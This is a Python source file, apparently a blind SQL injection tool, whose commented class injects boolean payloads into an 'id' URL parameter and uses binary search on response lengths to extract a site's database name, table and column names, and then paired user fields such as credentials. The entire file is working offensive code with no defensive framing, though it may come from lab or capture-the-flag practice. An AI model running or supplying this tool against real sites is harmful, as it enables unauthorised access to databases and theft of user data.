#encoding=utf-8
#author beglage

import requests
import sys
import test_bihe
class B(object):
    def __init__(self,URL):
        self.url = URL
        self.cmode = test_bihe.bihefangshi(self.url)
    
    #得到请求头
    def getFlag(self,fUrl):
        res = requests.get(fUrl)
        return res.text
    #得到正常响应页面的长度
    def getNormalLen(self,url):
        normalHtmlLen = len(requests.get(url=url+"?id=1").text)
        return normalHtmlLen

    #判断能否使用布尔盲注
    def isBoolSQLI(self):
        normalLen=self.getNormalLen(self.url)
        testPayload="?id=1"+self.cmode+"+and+1=2%23"
        fullURL=self.url+testPayload
        if len(requests.get(fullURL).text) == normalLen:
            return "error"
        return "yes"

    # 判断响应状态
    def http_get(self, payload):
        normalLen = self.getNormalLen(self.url)
        result = self.url + payload
        # print(result)
        if len(requests.get(result).text) == normalLen:
            return True
        else:
            return False

    # 二分法
    def half(self, l, h, payload):
        low = l
        high = h
        while low <= high:
            mid = (low + high) / 2
            mid_payload = "?id=1" + self.cmode + " and %s > %d --+" % (payload, mid)
            # print(mid_payload)
            # print(mid_html)
            if self.http_get(mid_payload):
                low = mid + 1
            else:
                high = mid - 1
        mid = int((low + high + 1) / 2)
        return mid

    # 得到当前数据库名
    def getCurrentDbName(self):
        key = "database()"
        tableName = self.getResult(key)
        return tableName

    def getResult(self, key):
        Name = ""
        # key="select group_concat(table_name separator ';') from information_schema.tables where table_schema=database()"
        # print("[*]Name getting...")
        payload = "length((" + key + "))"
        NameLen = self.half(0, 1000, payload)
        for i in range(1, NameLen + 1):
            payload = "ascii(substr((" + key + ")," + str(i) + ",1))"
            mid = self.half(0, 126, payload)
            Name = Name + chr(mid)
            # print("[+]The Name is ",Name)
        return Name

    # 得到数据库表名
    def getTableName(self, key):
        key = "select group_concat(table_name separator ';') from information_schema.tables where table_schema='" + key + "'"
        tableName = self.getResult(key)
        return tableName

    # 获取表中字段名
    def getColumnName(self, key):
        key = "select group_concat(column_name separator ';') from information_schema.columns where table_schema=database() and table_name='" + key + "'"
        columnName = self.getResult(key)
        return columnName

    # 获取用户信息
    def getUserInfo(self, key1, key2, key3):
        key = "select group_concat(" + key1 + ",':'," + key2 + " separator ';') from " + key3 + ""
        userInfo = self.getResult(key)
        return userInfo


    



